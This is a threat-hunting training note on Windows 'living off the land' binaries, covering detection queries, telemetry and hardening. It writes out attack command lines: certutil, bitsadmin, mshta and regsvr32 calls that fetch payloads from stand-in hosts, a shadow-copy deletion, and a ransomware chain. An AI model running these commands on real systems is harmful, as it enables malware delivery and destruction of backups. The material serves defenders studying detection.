---
tags: [threat-hunting, endpoint, windows, sysmon, vapt]
difficulty: intermediate
module: "89 - Endpoint Threat Hunting: Windows, Sysmon, EDR"
topic: "89.04 Hunting for Living off the Land Binaries LOLBAS"
---

# Hunting for Living off the Land Binaries (LOLBAS)

## 1. Introduction to LOLBAS

Living off the Land (LotL) is an attack methodology where threat actors utilize pre-installed, native system tools to carry out post-exploitation activities. In the Windows ecosystem, these tools are commonly referred to as **LOLBAS** (Living Off The Land Binaries and Scripts). 

Because these binaries (like `certutil.exe`, `bitsadmin.exe`, or `mshta.exe`) are digitally signed by Microsoft and are required for the normal functioning of the Operating System, they cannot simply be deleted or blocked by legacy Antivirus solutions without causing catastrophic system instability. Attackers abuse these trusted tools to proxy execution, download payloads, bypass application allowlisting (like Windows Defender Application Control or AppLocker), and blend in with legitimate administrative traffic.

Hunting for LOLBAS abuse requires a shift from looking for "known bad files" to identifying "known good files exhibiting bad behavior."

## 2. Common LOLBins and Malicious Tradecraft

The LOLBAS project (lolbas-project.github.io) tracks hundreds of binaries. However, a specific subset is overwhelmingly favored by threat actors.

### 2.1 `certutil.exe`
Originally designed for managing Windows Certificate Authority (CA) components.
- **Malicious Use**: File downloading and encoding/decoding.
- **Tradecraft**: Attackers use the `-urlcache` and `-split` arguments to download payloads from remote servers without using PowerShell or browsers. They also use `-encode` and `-decode` to bypass AV by dropping Base64 encoded malware, and decoding it natively on the endpoint.
- **Example**: `certutil.exe -urlcache -split -f http://malicious.com/payload.exe C:\Temp\payload.exe`

### 2.2 `mshta.exe`
The Microsoft HTML Application host, designed to execute `.hta` files.
- **Malicious Use**: Proxy execution of malicious VBScript or JScript.
- **Tradecraft**: `mshta.exe` can execute scripts directly from a URL, bypassing application allowlisting because `mshta.exe` itself is a trusted, signed binary.
- **Example**: `mshta.exe javascript:a=GetObject("script:http://c2.com/payload.sct");close();`

### 2.3 `regsvr32.exe` (Squiblydoo)
A command-line utility to register and unregister OLE controls, such as DLLs and ActiveX controls.
- **Malicious Use**: Execution of remote COM scriptlets (`.sct`), bypassing AppLocker.
- **Tradecraft**: Discovered by Casey Smith, this technique uses `scrobj.dll` to execute remote XML/Scriptlet payloads seamlessly.
- **Example**: `regsvr32.exe /s /n /u /i:http://malicious.com/payload.sct scrobj.dll`

### 2.4 `bitsadmin.exe`
Background Intelligent Transfer Service (BITS) administration tool.
- **Malicious Use**: Stealthy, asynchronous file downloading and persistence.
- **Tradecraft**: BITS jobs run in the background (often under `svchost.exe`), surviving reboots and utilizing idle network bandwidth, making network detection highly difficult.
- **Example**: `bitsadmin /transfer myjob /download /priority normal http://c2.com/malware.exe C:\Temp\malware.exe`

### 2.5 `wmic.exe`
Windows Management Instrumentation Command-line.
- **Malicious Use**: Lateral movement, execution, and defense evasion (e.g., deleting shadow copies).
- **Tradecraft**: WMIC can execute processes locally or remotely. Ransomware operators heavily use it to delete Volume Shadow Copies to prevent recovery.
- **Example**: `wmic.exe shadowcopy delete` or `wmic.exe process call create "cmd.exe /c payload.exe"`

## 3. Visualizing LOLBin Proxy Execution

The following diagram illustrates how an attacker bypasses AppLocker by using `regsvr32.exe` to proxy the execution of a malicious payload.

```text
+-----------------------------------+
|     Windows Execution Flow        |
|                                   |
|  1. Attacker attempts direct      |    [AppLocker/WDAC]
|     execution of malware.exe      | ---> BLOCKED (Untrusted binary)
|                                   |
|  2. Attacker invokes signed LOLBin|
|     (regsvr32.exe /i:http...)     | ---> ALLOWED (Microsoft Signed)
|                                   |
+----------------|------------------+
                 |
                 v
+-----------------------------------+
|      Proxy Execution Chain        |
|                                   |
|  regsvr32.exe (Trusted)           |
|      |                            |
|      +-> Loads scrobj.dll         |
|             |                     |
|             +-> Fetches .sct from |
|                 Network (C2)      |
|                    |              |
|                    +-> Executes   |
|                        VBScript/  |
|                        JScript    |
|                        in memory  |
+-----------------------------------+
```

## 4. Real-World Attack Scenario

### Ransomware Operator Utilizing Multiple LOLBins
An Initial Access Broker (IAB) compromises an endpoint and hands access to a Ransomware operator. The operator uses a chain of LOLBins to bypass the endpoint's strict Antivirus policies.

1. **Payload Staging (`certutil.exe`)**:
   - The attacker executes: `certutil.exe -urlcache -split -f http://evil.com/payload.b64 C:\Users\Public\encoded.txt`
   - **Telemetry**: Sysmon Event 1 shows `certutil.exe` with suspicious command line. Sysmon Event 3 shows `certutil.exe` making an outbound HTTP connection.
2. **De-obfuscation (`certutil.exe`)**:
   - The attacker executes: `certutil.exe -decode C:\Users\Public\encoded.txt C:\Users\Public\payload.dll`
   - This bypasses network AV, as the file came across the wire as harmless text.
3. **Execution (`rundll32.exe`)**:
   - The attacker executes: `rundll32.exe C:\Users\Public\payload.dll,EntryPoint`
   - **Telemetry**: Windows Event 4688 logs `rundll32.exe` executing a DLL from a user-writable directory without a standard control panel (`.cpl`) context.
4. **Defense Evasion (`wmic.exe`)**:
   - Before triggering the ransomware encryption routine, the attacker executes: `wmic.exe shadowcopy delete`
   - **Telemetry**: Event 4688 captures the specific command line designed to destroy system backups.

## 5. Detection and Threat Hunting Strategies

Hunting LOLBAS relies heavily on Windows Event 4688 (Process Creation with Command Line Logging) and Sysmon Event 1 (Process Creation). 

### 5.1 KQL Query: Suspicious `certutil.exe` Usage
```kusto
SecurityEvent
| where EventID == 4688
| where ProcessName endswith "certutil.exe"
| where CommandLine has_any ("-urlcache", "-split", "-decode", "-f")
| project TimeGenerated, Computer, Account, ProcessName, CommandLine
```

### 5.2 KQL Query: `regsvr32.exe` Squiblydoo Execution
```kusto
SysmonEvent
| where EventID == 1
| where Image endswith "regsvr32.exe"
| where CommandLine has_all ("/i:", "/s", "scrobj.dll")
   or CommandLine has "http"
| project TimeGenerated, Computer, User, Image, CommandLine, ParentImage
```

### 5.3 Behavioral Hunting Anomalies
Beyond specific command lines, hunters should look for behavioral anomalies:
- **Network Connections from Uncommon Processes**: `regsvr32.exe`, `rundll32.exe`, `msbuild.exe`, and `wmic.exe` rarely need to make outbound connections to public IP addresses over port 80/443. (Correlate Sysmon Event 1 with Event 3).
- **Execution from Temp Directories**: A LOLBin executing a file located in `C:\Users\*\AppData\Local\Temp\` or `C:\ProgramData\` is highly suspicious.
- **Unusual Parent Processes**: If `mshta.exe` is spawned by `winword.exe` (Microsoft Word), it is almost certainly a malicious macro execution.

## 6. Mitigation and Hardening

1. **Windows Defender Application Control (WDAC)**: While LOLBins can bypass basic AppLocker rules, WDAC can be configured to block specific binaries entirely or restrict them using the Microsoft Recommended Block Rules (which explicitly block `mshta.exe`, `wscript.exe`, and others).
2. **AppLocker Script Rules**: Enforce AppLocker rules to block the execution of `.hta`, `.vbs`, `.js`, and `.sct` files for standard users.
3. **Attack Surface Reduction (ASR)**: Enable ASR rules like "Block executable files from running unless they meet a prevalence, age, or trusted list criterion" and "Block JavaScript or VBScript from launching downloaded executable content."

## 7. Chaining Opportunities
- **[[01 - Windows Event Logs Deep Dive Event IDs 4624 4688]]**: Event 4688 Command Line logging is the primary data source for spotting LOLBin abuse.
- **[[02 - Microsoft Sysmon Configuration and Telemetry]]**: Sysmon Event 3 is critical for detecting LOLBins making unexpected network callbacks.
- **[[05 - Detecting PowerShell Downgrade and Obfuscation]]**: PowerShell is the ultimate LOLBin. Understanding its specific evasion techniques is a discipline onto itself.

## 8. Related Notes
- [[Windows AppLocker Bypass Techniques]]
- [[Sysinternals Suite for Threat Hunting]]
- [[Initial Access via Office Macros]]
